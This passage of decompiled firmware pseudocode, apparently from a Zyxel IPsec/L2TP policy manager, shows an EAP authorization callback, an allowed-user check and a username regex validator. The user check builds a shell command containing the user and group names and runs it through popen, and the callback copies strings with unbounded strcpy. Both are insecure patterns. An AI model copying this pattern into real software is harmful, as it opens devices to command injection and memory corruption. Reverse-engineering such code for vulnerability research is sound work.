        *(_BYTE *)(*(_DWORD *)(v36 + 248) + 260) = 0;
      }
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v14 = sub_1028B1CC("authmodule: %s", *(_DWORD *)(v36 + 248) + 260);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1805LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v14);
      }
      if ( sub_1018EE10(*a3) )
      {
        v15 = (char *)(*(_DWORD *)(v36 + 248) + 292);
        v16 = (const char *)sub_1018EE10(*a3);
        strcpy(v15, v16);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v36 + 248) + 292) = 0;
      }
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v17 = sub_1028B1CC("server_type: %s", *(_DWORD *)(v36 + 248) + 292);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1812LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v17);
      }
      if ( sub_1018EEC8(*a3) )
      {
        v18 = (char *)(*(_DWORD *)(v36 + 248) + 344);
        v19 = (const char *)sub_1018EEC8(*a3);
        strcpy(v18, v19);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v36 + 248) + 344) = 0;
      }
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v20 = sub_1028B1CC("mobile: %s", *(_DWORD *)(v36 + 248) + 344);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1819LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v20);
      }
      if ( sub_1018EF80(*a3) )
      {
        v21 = (char *)(*(_DWORD *)(v36 + 248) + 376);
        v22 = (const char *)sub_1018EF80(*a3);
        strcpy(v21, v22);
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)(v36 + 248) + 376) = 0;
      }
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v23 = sub_1028B1CC("email: %s", *(_DWORD *)(v36 + 248) + 376);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1825LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v23);
      }
      v24 = *(_DWORD *)(v36 + 248);
      *(_DWORD *)(v24 + 256) = sub_1012C704(v24 + 292);
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
      {
        v25 = sub_1028B1CC("authmodule value: %d", *(int *)(*(_DWORD *)(v36 + 248) + 256));
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1829LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v25);
      }
      LODWORD(v32) = *(_DWORD *)(*(_DWORD *)(v36 + 248) + 192);
      sub_1028F6A0(
        13LL,
        12LL,
        0LL,
        0LL,
        0LL,
        0LL,
        0LL,
        0LL,
        "unique_id: %d zy_real_name: %s authmodule: %s server_type: %s authmodule value: %d",
        v32,
        (const char *)(*(_DWORD *)(v36 + 248) + 64),
        (const char *)(*(_DWORD *)(v36 + 248) + 260),
        (const char *)(*(_DWORD *)(v36 + 248) + 292),
        *(_DWORD *)(*(_DWORD *)(v36 + 248) + 256));
      v26 = *(_DWORD *)(v36 + 248);
      *(_DWORD *)(v26 + 252) = sub_1018F0E0(*a3);
      v27 = *(_DWORD *)(v36 + 248);
      *(_DWORD *)(v27 + 248) = sub_1018F038(*a3);
      if ( strcmp(*(const char **)(a3[2] + 40), "any") )
        v34 = sub_1012D19C(*(int *)(v36 + 248), (int)"check-user");
      if ( v34 )
      {
        *(_WORD *)(v36 + 244) = *(_WORD *)(v36 + 244) & 0xFEFF | 0x100;
        if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
        {
          v28 = sub_1028B1CC("check user rejected: %d", (*(_QWORD *)(v36 + 240) >> 24) & 1LL);
          sub_1028DC68(
            7LL,
            (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
            1847LL,
            (int)"SshPmIkeEapPAD",
            (int)"pm_ike_eap_authorization_cb",
            v28);
        }
        sub_10074148(0LL, 0LL, a3[3], (int)"EAP authorize not allowd");
        sub_100E59B8((int)v36, 0LL, *(_DWORD *)(v36 + 248) + 64, 0LL);
        sub_100D92D0((int)a3);
      }
    }
  }
  else if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 7) )
  {
    v4 = sub_1028B1CC("Can't get user_name from remote id");
    sub_1028DC68(
      7LL,
      (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
      1771LL,
      (int)"SshPmIkeEapPAD",
      (int)"pm_ike_eap_authorization_cb",
      v4);
  }
  v37 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a3[3] + 932) + 8) + 32);
  if ( v37 )
    sub_1028F7E0(
      *(int *)(v37 + 12) == -18779795LL,
      (int)"(qm) && (qm)->magic == 0xfee1716d",
      (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
      1862LL,
      (int)"SshPmIkeEapPAD",
      (int)"pm_ike_eap_authorization_cb",
      2LL);
  if ( v37 && *(_DWORD *)(v37 + 912) )
  {
    if ( *(_DWORD *)(v36 + 408) )
      sub_10297F3C(*(int *)(v36 + 408), (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c", 1869LL);
    *(_DWORD *)(v36 + 408) = 0;
    if ( v41 )
      *(_DWORD *)(v36 + 408) = sub_102984CC(v40, 4 * v41);
    *(_DWORD *)(v36 + 412) = v41;
    *(_WORD *)(v36 + 364) = *(_WORD *)(v36 + 364) & 0xFFEF | 0x10;
    if ( sub_1006B94C((int)v36, *(int *)(v37 + 912)) )
    {
      sub_10173E10(*a3, (int)&v38, (int)&v39);
      if ( !v38 && sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 5) )
      {
        v30 = sub_1028B1CC("This EAP method does not return a key");
        sub_1028DC68(
          5LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1892LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v30);
      }
      v33 = 0;
    }
    else
    {
      if ( sub_1028B240() && sub_1028B280((int)"SshPmIkeEapPAD", 3) )
      {
        v29 = sub_1028B1CC("Authorization failed; access groups did not match");
        sub_1028DC68(
          3LL,
          (int)"../../../ipsec/quicksec/policymanager/pad_ike_eap.c",
          1882LL,
          (int)"SshPmIkeEapPAD",
          (int)"pm_ike_eap_authorization_cb",
          v29);
      }
      *(_DWORD *)(*(_DWORD *)(v36 + 932) + 348) |= 0x20u;
    }
  }
  ((void (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))a3[34])(v33, v38, v39, a3[35]);
  sub_102AA46C((int)(a3 + 36));
  a3[34] = 0;
  result = (int)a3;
  a3[35] = 0;
  return result;
}

__int64 __fastcall sub_1012C8DC(char *a1, char *a2, char *a3)
{
  __int64 v3; // $v0
  __int64 v4; // $v0
  __int64 v5; // $v0
  __int64 v6; // $v0
  __int64 v7; // $v0
  __int64 v8; // $v0
  __int64 v9; // $v0
  int v11; // [sp+0h] [+0h]
  FILE *stream; // [sp+4h] [+4h]
  char v13[512]; // [sp+8h] [+8h] BYREF
  char v14[2048]; // [sp+208h] [+208h] BYREF
  char v15[168]; // [sp+A08h] [+A08h] BYREF
  char *v16; // [sp+AB0h] [+AB0h]
  char *v17; // [sp+AB4h] [+AB4h]
  char *v18; // [sp+AB8h] [+AB8h]

  v16 = a1;
  v17 = a2;
  v18 = a3;
  v11 = 0;
  stream = 0;
  if ( a1 && v17 && v18 )
  {
    if ( sub_100739B0(v16) )
    {
      if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 7LL) )
      {
        v5 = sub_1028B1CC("user_name: %s, allowed_user: %s, allowed_user_type: %s", (int)v16, (int)v17, (int)v18);
        sub_1028DC68(
          7LL,
          (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
          189LL,
          (int)"ZyUtilPam",
          (int)"zy_ssh_pm_l2tp_check_allowed_user",
          v5);
      }
      if ( strcmp(v18, "user") )
      {
        if ( sub_10460C78((int)"/tmp/zld_group_database", (int)v15) )
        {
          v11 = -1;
        }
        else
        {
          sub_10293F88(
            (int)v13,
            512LL,
            "/bin/cat %s | grep -e '^%s#' | grep -e '#%s[,]'",
            (int)"/tmp/zld_group_database",
            (int)v17,
            (int)v16);
          if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 7LL) )
          {
            v7 = sub_1028B1CC("zysh cmd: %s", (int)v13);
            sub_1028DC68(
              7LL,
              (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
              211LL,
              (int)"ZyUtilPam",
              (int)"zy_ssh_pm_l2tp_check_allowed_user",
              v7);
          }
          stream = popen(v13, "r");
          if ( stream )
          {
            if ( !fgets(v14, 2048, stream) )
            {
              if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 3LL) )
              {
                v9 = sub_1028B1CC("allowed user is not matched (group mode)");
                sub_1028DC68(
                  3LL,
                  (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
                  223LL,
                  (int)"ZyUtilPam",
                  (int)"zy_ssh_pm_l2tp_check_allowed_user",
                  v9);
              }
              v11 = -1;
            }
          }
          else
          {
            if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 3LL) )
            {
              v8 = sub_1028B1CC("pipe open zysh has failed");
              sub_1028DC68(
                3LL,
                (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
                216LL,
                (int)"ZyUtilPam",
                (int)"zy_ssh_pm_l2tp_check_allowed_user",
                v8);
            }
            v11 = -2;
          }
        }
      }
      else if ( strcmp(v17, v16) )
      {
        if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 3LL) )
        {
          v6 = sub_1028B1CC("allowed user is not matched (user mode)");
          sub_1028DC68(
            3LL,
            (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
            195LL,
            (int)"ZyUtilPam",
            (int)"zy_ssh_pm_l2tp_check_allowed_user",
            v6);
        }
        v11 = -1;
      }
    }
    else
    {
      if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 3LL) )
      {
        v4 = sub_1028B1CC("regex check fail");
        sub_1028DC68(
          3LL,
          (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
          184LL,
          (int)"ZyUtilPam",
          (int)"zy_ssh_pm_l2tp_check_allowed_user",
          v4);
      }
      v11 = -1;
    }
  }
  else
  {
    if ( sub_1028B240() && sub_1028B280((int)"ZyUtilPam", 3LL) )
    {
      v3 = sub_1028B1CC("wrong parameters");
      sub_1028DC68(
        3LL,
        (int)"../../../ipsec/quicksec/policymanager/zy_util_pam.c",
        177LL,
        (int)"ZyUtilPam",
        (int)"zy_ssh_pm_l2tp_check_allowed_user",
        v3);
    }
    v11 = -1;
  }
  if ( stream )
    pclose(stream);
  return v11;
}

__int64 __fastcall sub_100739B0(char *a1)
{
  int v1; // $v0
  __int64 v2; // $s0
  _BOOL4 v4; // [sp+0h] [+0h]
  int errcode; // [sp+8h] [+8h]
  regex_t v6; // [sp+10h] [+10h] BYREF
  regmatch_t v7; // [sp+30h] [+30h] BYREF
  char v8[264]; // [sp+38h] [+38h] BYREF
  char *string; // [sp+140h] [+140h]

  string = a1;
  v1 = regcomp(&v6, "[a-zA-Z_-][a-zA-Z0-9@\\._-]{0,30}", 1);
  sub_1028F7E0(
    v1 == 0LL,
    (int)"value == 0",
    (int)"../../../ipsec/quicksec/policymanager/util_render.c",
    33LL,
    (int)"SshPmUtilRender",
    (int)"zy_valid_username",
    2LL);
  errcode = regexec(&v6, string, 1u, &v7, 0);
  if ( errcode == 1LL )
  {
    sub_1028EA98("no match username\n");
    v4 = 0;
  }
  else if ( errcode )
  {
    regerror(errcode, &v6, v8, 0x100u);
    sub_1028EA98("decode error: %s\n", (int)v8);
    v4 = 0;
  }
  else
  {
    v2 = v7.rm_eo - v7.rm_so;
    v4 = v2 == strlen(string);
  }
  regfree(&v6);
  return v4;
}
```